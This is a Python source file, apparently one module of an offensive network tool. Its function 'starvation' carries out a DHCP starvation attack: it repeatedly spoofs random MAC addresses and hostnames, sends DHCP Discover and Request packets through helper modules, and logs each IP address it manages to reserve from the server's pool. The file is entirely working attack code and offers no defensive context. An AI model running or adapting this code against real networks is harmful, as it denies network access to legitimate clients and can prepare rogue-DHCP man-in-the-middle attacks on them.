#!/usr/bin/python3

# Set color variables
Green = "\033[1;32m"
Blue = "\033[1;34m"
Red = "\033[1;33m"
White = "\033[0m"

# Import modules
import fct_random
import fct_dhcp

def starvation(free_ip, interface):

    reserved_IP = []
    cpt = (len(free_ip) - 2)

    while len(free_ip) > cpt:
        
        # Get random value
        hostname = fct_random.hostname()
        xid = fct_random.transaction_id()
        mac = fct_random.valid_mac()

        # DHCP Discover
        sniff_packet = fct_dhcp.listener(mac)
        fct_dhcp.discover(mac, hostname, xid, interface)
        # DHCP Offer
        dhcp_offer = fct_dhcp.listener_join(sniff_packet)
        dst_mac, offer_ip = fct_dhcp.get_offer_information(dhcp_offer)
        # DHCP Request
        sniff_packet = fct_dhcp.listener(mac)
        fct_dhcp.request(dst_mac, offer_ip, hostname, xid, interface)
        # DHCP Ack
        dhcp_ack = fct_dhcp.listener_join(sniff_packet)
        ack_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)

        # Output
        if ack_ip:
            print(f"{Green}[DHCP]{White} New ip reserved - {ack_ip}")
            free_ip.remove(ack_ip)
            reserved_IP.append((ack_ip, ack_mac))
    
    return reserved_IP